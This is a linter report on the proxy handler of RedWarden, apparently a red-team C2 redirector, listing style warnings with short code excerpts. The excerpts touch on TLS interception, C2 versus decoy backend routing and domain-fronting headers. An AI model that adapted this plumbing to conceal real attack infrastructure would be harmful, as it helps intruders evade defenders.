F401 [*] `io.StringIO` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:24:25
   |
22 | from html.parser import HTMLParser
23 | from http.server import BaseHTTPRequestHandler
24 | from io import BytesIO, StringIO
   |                         ^^^^^^^^
25 | from subprocess import PIPE, Popen
26 | from urllib.parse import parse_qsl, urlparse
   |
help: Remove unused import: `io.StringIO`

F403 `from lib.utils import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:41:1
   |
39 | from lib.proxylogger import ProxyLogger
40 | from lib.sslintercept import SSLInterception
41 | from lib.utils import *
   | ^^^^^^^^^^^^^^^^^^^^^^^
42 |
43 | urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   |

B007 Loop control variable `v` not used within loop body
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:64:16
   |
62 |         ]
63 |
64 |         for k, v in headers.items():
   |                ^
65 |             if k.lower() in xhdrs:
66 |                 headers.pop(k)
   |
help: Rename unused `v` to `_v`

B007 Loop control variable `name` not used within loop body
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:91:13
   |
89 |         self.server_address, self.all_server_addresses = ProxyRequestHandler.get_ip()
90 |
91 |         for name, plugin in self.plugins.items():
   |             ^^^^
92 |             plugin.logger = logger
   |
help: Rename unused `name` to `_name`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:101:12
    |
100 |     def set_default_headers(self):
101 |         if "Server" in self._headers.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
102 |             self.set_header("Server", "nginx")
    |
help: Remove `.keys()`

N806 Variable `IP` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:121:13
    |
119 |             # doesn't even have to be reachable
120 |             s.connect(("10.255.255.255", 1))
121 |             IP = s.getsockname()[0]
    |             ^^
122 |         except:
123 |             IP = "127.0.0.1"
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:122:9
    |
120 |             s.connect(("10.255.255.255", 1))
121 |             IP = s.getsockname()[0]
122 |         except:
    |         ^^^^^^
123 |             IP = "127.0.0.1"
124 |         finally:
    |

N806 Variable `IP` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:123:13
    |
121 |             IP = s.getsockname()[0]
122 |         except:
123 |             IP = "127.0.0.1"
    |             ^^
124 |         finally:
125 |             s.close()
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:131:13
    |
129 |     def log_message(self, format, *args):
130 |         if (self.options["verbose"] or self.options["debug"]) or (
131 |             type(self.options["log"]) == str and self.options["log"] != "none"
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
132 |         ):
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:134:19
    |
132 |           ):
133 |
134 |               txt = "%s - - [%s] %s\n" % (
    |  ___________________^
135 | |                 self.address_string(),
136 | |                 self.log_date_time_string(),
137 | |                 format % args,
138 | |             )
    | |_____________^
139 |
140 |               self.logger.out(txt, self.options["log"], "")
    |
help: Replace with format specifiers

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:180:9
    |
178 |                 if not readable(v):
179 |                     return False
180 |         except:
    |         ^^^^^^
181 |             return False
    |

F405 `self` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:191:13
    |
190 |         if not os.path.isfile(certpath):
191 |             self.logger.dbg(
    |             ^^^^
192 |                 "Generating valid SSL certificate for ({})...".format(hostname)
193 |             )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:192:17
    |
190 |         if not os.path.isfile(certpath):
191 |             self.logger.dbg(
192 |                 "Generating valid SSL certificate for ({})...".format(hostname)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
193 |             )
194 |             epoch = "%d" % (time.time() * 1000)
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:194:21
    |
192 |                 "Generating valid SSL certificate for ({})...".format(hostname)
193 |             )
194 |             epoch = "%d" % (time.time() * 1000)
    |                     ^^^^
195 |
196 |             # Workaround for the Windows' RANDFILE bug
    |
help: Replace with format specifiers

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:197:20
    |
196 |             # Workaround for the Windows' RANDFILE bug
197 |             if not "RANDFILE" in os.environ.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
198 |                 os.environ["RANDFILE"] = os.path.normpath(
199 |                     "%s/.rnd" % (options["certdir"].rstrip("/"))
    |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:197:20
    |
196 |             # Workaround for the Windows' RANDFILE bug
197 |             if not "RANDFILE" in os.environ.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
198 |                 os.environ["RANDFILE"] = os.path.normpath(
199 |                     "%s/.rnd" % (options["certdir"].rstrip("/"))
    |
help: Convert to `not in`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:199:21
    |
197 |             if not "RANDFILE" in os.environ.keys():
198 |                 os.environ["RANDFILE"] = os.path.normpath(
199 |                     "%s/.rnd" % (options["certdir"].rstrip("/"))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
200 |                 )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:209:17
    |
207 |                 options["certkey"],
208 |                 "-subj",
209 |                 "/CN=%s" % hostname,
    |                 ^^^^^^^^^^^^^^^^^^^
210 |             ]
211 |             cmd2 = [
    |
help: Replace with format specifiers

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:232:41
    |
230 |                 (stdout, stderr) = p2.communicate()
231 |
232 |             except FileNotFoundError as e:
    |                                         ^
233 |                 logger.err(
234 |                     "Can't serve HTTPS traffic because there is no 'openssl' tool installed on the system!"
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:245:21
    |
243 |               if stdout or stderr:
244 |                   logger.err(
245 | /                     "Openssl x509 crt request failed:\n{}".format(
246 | |                         (stdout + stderr).decode()
247 | |                     )
    | |_____________________^
248 |                   )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:251:17
    |
250 |             logger.fatal(
251 |                 'Could not create interception Certificate: "{}"'.format(certpath)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
252 |             )
253 |             return ""
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:261:25
    |
259 |         certpath = ""
260 |
261 |         self.logger.dbg('CONNECT intercepted: "%s"' % self.request.uri)
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
262 |
263 |         certpath = ProxyRequestHandler.generate_ssl_certificate(hostname)
    |
help: Replace with format specifiers

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:278:9
    |
276 |                 )
277 |             )
278 |         except:
    |         ^^^^^^
279 |             self.logger.err('Connection reset by peer: "{}"'.format(self.request.uri))
280 |             self._send_error(502)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:279:29
    |
277 |             )
278 |         except:
279 |             self.logger.err('Connection reset by peer: "{}"'.format(self.request.uri))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
280 |             self._send_error(502)
281 |             return
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:294:25
    |
292 |         address[1] = int(address[1]) or 443
293 |
294 |         self.logger.dbg('CONNECT relaying: "%s"' % self.request.uri)
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
295 |
296 |         try:
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:299:29
    |
297 |             s = socket.create_connection(address, timeout=self.options["timeout"])
298 |         except Exception as e:
299 |             self.logger.err("Could not relay connection: ({})".format(str(e)))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
300 |             self._send_error(502)
301 |             return
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:324:13
    |
322 |       def reverse_proxy_loop_detected(self, command, fetchurl, req_body):
323 |           self.logger.err(
324 | /             "[Reverse-proxy loop detected from peer {}] {} {}".format(
325 | |                 self.client_address[0], command, fetchurl
326 | |             )
    | |_____________^
327 |           )
    |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:344:9
    |
342 |           timestamp = datetime.utcnow()
343 |
344 | /         if (
345 | |             hasattr(self, "request")
346 | |             and hasattr(self.request, "uri")
347 | |             and type(self.request.uri) == str
348 | |         ):
349 | |             if self.request.uri.startswith("//"):
    | |_________________________________________________^
350 |                   self.request.uri = self.request.uri[1:]
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:347:17
    |
345 |             hasattr(self, "request")
346 |             and hasattr(self.request, "uri")
347 |             and type(self.request.uri) == str
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
348 |         ):
349 |             if self.request.uri.startswith("//"):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:356:13
    |
354 |         remote_host = self.request.client_address
355 |         if (
356 |             type(self.request.client_address) == list
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
357 |             or type(self.request.client_address) == tuple
358 |         ) and len(self.request.client_address) > 0:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:357:16
    |
355 |         if (
356 |             type(self.request.client_address) == list
357 |             or type(self.request.client_address) == tuple
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
358 |         ) and len(self.request.client_address) > 0:
359 |             remote_host = self.request.client_address[0]
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:371:17
    |
369 |                     if ":" in auth_decoded:
370 |                         http_basic_auth = auth_decoded.split(":")[0]
371 |                 except:
    |                 ^^^^^^
372 |                     pass
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:392:12
    |
390 |         override_suppress_log = False
391 |
392 |         if "access_log_format" in self.options.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
393 |             if self.options["access_log_format"] == None:
394 |                 self.options["access_log_format"] = "apache2"
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:393:53
    |
392 |         if "access_log_format" in self.options.keys():
393 |             if self.options["access_log_format"] == None:
    |                                                     ^^^^
394 |                 self.options["access_log_format"] = "apache2"
    |
help: Replace with `cond is None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:413:20
    |
411 |                 backend_name_decoy = "decoy"
412 |
413 |                 if "redelk_frontend_name" in self.options.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
414 |                     frontend_name = self.options["redelk_frontend_name"]
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:416:20
    |
414 |                     frontend_name = self.options["redelk_frontend_name"]
415 |
416 |                 if "redelk_backend_name_c2" in self.options.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
417 |                     backend_name_c2 = self.options["redelk_backend_name_c2"]
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:419:20
    |
417 |                     backend_name_c2 = self.options["redelk_backend_name_c2"]
418 |
419 |                 if "redelk_backend_name_decoy" in self.options.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
420 |                     backend_name_decoy = self.options["redelk_backend_name_decoy"]
    |
help: Remove `.keys()`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:438:17
    |
436 |                         self.request.connection.stream.socket.getpeername()[1]
437 |                     )
438 |                 except:
    |                 ^^^^^^
439 |                     remote_host_port = 0
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:450:9
    |
448 |                   override_suppress_log = True
449 |
450 | /         if (
451 | |             "access_log" in self.options.keys()
452 | |             and self.options["access_log"] != None
453 | |             and len(self.options["access_log"]) > 0
454 | |         ):
455 | |             if not self.request.suppress_log_entry or override_suppress_log:
    | |____________________________________________________________________________^
456 |                   with open(self.options["access_log"], "a") as f:
457 |                       f.write(line + "\n")
    |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:451:13
    |
450 |         if (
451 |             "access_log" in self.options.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
452 |             and self.options["access_log"] != None
453 |             and len(self.options["access_log"]) > 0
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:452:47
    |
450 |         if (
451 |             "access_log" in self.options.keys()
452 |             and self.options["access_log"] != None
    |                                               ^^^^
453 |             and len(self.options["access_log"]) > 0
454 |         ):
    |
help: Replace with `cond is not None`

F841 Local variable `output` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:500:9
    |
498 |             self.request.uri = newpath
499 |
500 |         output = handler()
    |         ^^^^^^
501 |
502 |         self.request.method = self.request.method
    |
help: Remove assignment to unused variable `output`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:513:13
    |
511 |             try:
512 |                 self.response_reason = requests.status_codes._codes[code][0]
513 |             except:
    |             ^^^^^^
514 |                 pass
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:526:13
    |
524 |             try:
525 |                 self.response_reason = requests.status_codes._codes[code][0]
526 |             except:
    |             ^^^^^^
527 |                 pass
    |

F841 Local variable `content_length` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:546:9
    |
544 |         self.request.is_ssl = self.is_ssl
545 |
546 |         content_length = int(self.request.headers.get("Content-Length", 0))
    |         ^^^^^^^^^^^^^^
547 |         if not self.options["allow_invalid"]:
548 |             if not ProxyRequestHandler.isValidRequest(self.request, self.request.body):
    |
help: Remove assignment to unused variable `content_length`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:547:9
    |
546 |           content_length = int(self.request.headers.get("Content-Length", 0))
547 | /         if not self.options["allow_invalid"]:
548 | |             if not ProxyRequestHandler.isValidRequest(self.request, self.request.body):
    | |_______________________________________________________________________________________^
549 |                   self.logger.dbg(
550 |                       "[DROP] Invalid HTTP request from: {}".format(
    |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:550:21
    |
548 |               if not ProxyRequestHandler.isValidRequest(self.request, self.request.body):
549 |                   self.logger.dbg(
550 | /                     "[DROP] Invalid HTTP request from: {}".format(
551 | |                         self.client_address[0]
552 | |                     )
    | |_____________________^
553 |                   )
554 |                   return
    |
help: Convert to f-string

N806 Variable `originChanged` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:565:9
    |
563 |         origuri = self.request.uri
564 |         newuri = self.request.uri
565 |         originChanged = False
    |         ^^^^^^^^^^^^^
566 |         ignore_response_decompression_errors = False
567 |         if "Host" not in self.request.headers.keys():
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:567:12
    |
565 |         originChanged = False
566 |         ignore_response_decompression_errors = False
567 |         if "Host" not in self.request.headers.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
568 |             self.request.headers["Host"] = self.request.host
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:571:13
    |
570 |         if (
571 |             "throttle_down_peer_logging" in self.options.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
572 |             and len(self.options["throttle_down_peer_logging"]) > 0
573 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:578:20
    |
576 |                 autocommit=True,
577 |             ) as mydict:
578 |                 if "peers" not in mydict.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
579 |                     mydict["peers"] = {}
    |
help: Remove `.keys()`

N806 Variable `peerIP` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:582:17
    |
581 |                 prev = mydict.get("peers", {})
582 |                 peerIP = plugins.malleable_redirector.ProxyPlugin.get_peer_ip(
    |                 ^^^^^^
583 |                     self.request
584 |                 )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:626:13
    |
625 |         self.logger.info(
626 |             "[REQUEST] {} {}".format(self.request.method, self.request.uri),
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
627 |             color=ProxyLogger.colors_map["green"],
628 |         )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:637:28
    |
635 |             newuri = self.request.uri
636 |
637 |             if modified != None and type(modified) == bool:
    |                            ^^^^
638 |                 modified |= origuri != newuri
    |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:637:37
    |
635 |             newuri = self.request.uri
636 |
637 |             if modified != None and type(modified) == bool:
    |                                     ^^^^^^^^^^^^^^^^^^^^^^
638 |                 modified |= origuri != newuri
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:647:41
    |
645 |             elif modified and req_body_modified is not None:
646 |                 self.request.body = req_body_modified
647 |                 if self.request.body != None:
    |                                         ^^^^
648 |                     reqhdrs = [x.lower() for x in self.request.headers.keys()]
649 |                     if "content-length" in reqhdrs:
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:648:46
    |
646 |                 self.request.body = req_body_modified
647 |                 if self.request.body != None:
648 |                     reqhdrs = [x.lower() for x in self.request.headers.keys()]
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
649 |                     if "content-length" in reqhdrs:
650 |                         del self.request.headers["Content-Length"]
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:656:38
    |
654 |             if (
655 |                 parsed.netloc != inbound_origin
656 |                 and parsed.netloc != None
    |                                      ^^^^
657 |                 and len(parsed.netloc) > 1
658 |             ):
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:660:21
    |
658 |               ):
659 |                   self.logger.info(
660 | /                     "Plugin redirected request from [{}] to [{}]".format(
661 | |                         inbound_origin, parsed.netloc
662 | |                     )
    | |_____________________^
663 |                   )
664 |                   outbound_origin = parsed.netloc
    |
help: Convert to f-string

N806 Variable `originChanged` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:665:17
    |
663 |                 )
664 |                 outbound_origin = parsed.netloc
665 |                 originChanged = True
    |                 ^^^^^^^^^^^^^
666 |                 # newuri = (parsed.path + '?' + parsed.query if parsed.query else parsed.path)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:671:21
    |
669 |             if "DropConnectionException" in str(e):
670 |                 self.logger.err(
671 |                     "Plugin demanded to drop the request: ({})".format(str(e))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
672 |                 )
673 |                 self.request.connection.no_keep_alive = True
    |
help: Convert to f-string

UP004 [*] Class `Response` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:681:32
    |
679 |                 res_body_plain = "DontFetchResponseException"
680 |
681 |                 class Response(object):
    |                                ^^^^^^
682 |                     pass
    |
help: Remove `object` inheritance

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:688:21
    |
686 |             else:
687 |                 self.logger.err(
688 |                     "Exception catched in request_handler: {}".format(str(e))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
689 |                 )
690 |                 if options["debug"]:
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:698:33
    |
696 |         if newuri[0] == "/":
697 |             if self.is_ssl:
698 |                 req_path_full = "https://%s%s" % (self.request.headers["Host"], newuri)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
699 |             else:
700 |                 req_path_full = "http://%s%s" % (self.request.headers["Host"], newuri)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:700:33
    |
698 |                 req_path_full = "https://%s%s" % (self.request.headers["Host"], newuri)
699 |             else:
700 |                 req_path_full = "http://%s%s" % (self.request.headers["Host"], newuri)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
701 |
702 |         elif newuri.startswith("http://") or newuri.startswith("https://"):
    |
help: Replace with format specifiers

SIM108 Use ternary operator `newpath = parsed.path if len(parsed.path) > 0 else "/"` instead of `if`-`else`-block
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:707:13
    |
705 |               parsed = urlparse(req_path_full)
706 |               newpath = ""
707 | /             if len(parsed.path) > 0:
708 | |                 newpath = parsed.path
709 | |             else:
710 | |                 newpath = "/"
    | |_____________________________^
711 |
712 |               if len(parsed.query) > 0:
    |
help: Replace `if`-`else`-block with `newpath = parsed.path if len(parsed.path) > 0 else "/"`

F841 Local variable `path` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:724:25
    |
723 |         u = urlparse(req_path_full)
724 |         scheme, netloc, path = (
    |                         ^^^^
725 |             u.scheme,
726 |             u.netloc,
    |
help: Remove assignment to unused variable `path`

F841 Local variable `origin` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:733:9
    |
731 |             netloc = inbound_origin
732 |
733 |         origin = (scheme, inbound_origin)
    |         ^^^^^^
734 |         neworigin = (scheme, netloc)
    |
help: Remove assignment to unused variable `origin`

F841 Local variable `neworigin` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:734:9
    |
733 |         origin = (scheme, inbound_origin)
734 |         neworigin = (scheme, netloc)
    |         ^^^^^^^^^
735 |
736 |         class MyResponse(http.client.HTTPResponse):
    |
help: Remove assignment to unused variable `neworigin`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:742:27
    |
740 |                 self.response_version = origreq.protocol_version
741 |
742 |                 if req != None:
    |                           ^^^^
743 |                     self.status = req.status_code
744 |                     self.headers = req.headers.copy()
    |
help: Replace with `cond is not None`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:773:17
    |
771 |                     ip = socket.gethostbyname(outbound_origin)
772 |
773 |                 except:
    |                 ^^^^^^
774 |                     ip = urlparse(fetchurl).netloc
775 |                     if not ip:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:782:21
    |
781 |                   if (
782 | /                     plugins.IProxyPlugin.proxy2_metadata_headers[
783 | |                         "ignore_response_decompression_errors"
784 | |                     ]
785 | |                     in self.request.headers.keys()
    | |__________________________________________________^
786 |                   ):
787 |                       ignore_response_decompression_errors = True
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:800:46
    |
798 |                     )
799 |
800 |                 reqhdrskeys = [x.lower() for x in self.request.headers.keys()]
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
801 |                 if (
802 |                     plugins.IProxyPlugin.proxy2_metadata_headers[
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:807:24
    |
805 |                     in reqhdrskeys
806 |                 ):
807 |                     if "Host" not in self.request.headers.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
808 |                         self.request.headers["Host"] = self.request.host
809 |                         self.set_header("Host", self.request.host)
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:820:27
    |
818 |                     fetchurl = fetchurl.replace(o, n)
819 |
820 |                     while "Host" in self.request.headers.keys():
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
821 |                         del self.request.headers["Host"]
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:827:41
    |
825 |                 # ProxyRequestHandler.filter_headers(self.request.headers, self.logger)
826 |                 req_body = ""
827 |                 if self.request.body == None:
    |                                         ^^^^
828 |                     req_body = ""
829 |                 else:
    |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:831:28
    |
829 |                 else:
830 |                     try:
831 |                         if type(self.request.body) == bytes:
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
832 |                             req_body = self.request.body
833 |                         else:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:845:21
    |
844 |                   if (
845 | /                     plugins.IProxyPlugin.proxy2_metadata_headers[
846 | |                         "domain_front_host_header"
847 | |                     ]
848 | |                     in new_req_headers.keys()
    | |_____________________________________________^
849 |                   ):
850 |                       if "Host" in new_req_headers.keys():
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:850:24
    |
848 |                     in new_req_headers.keys()
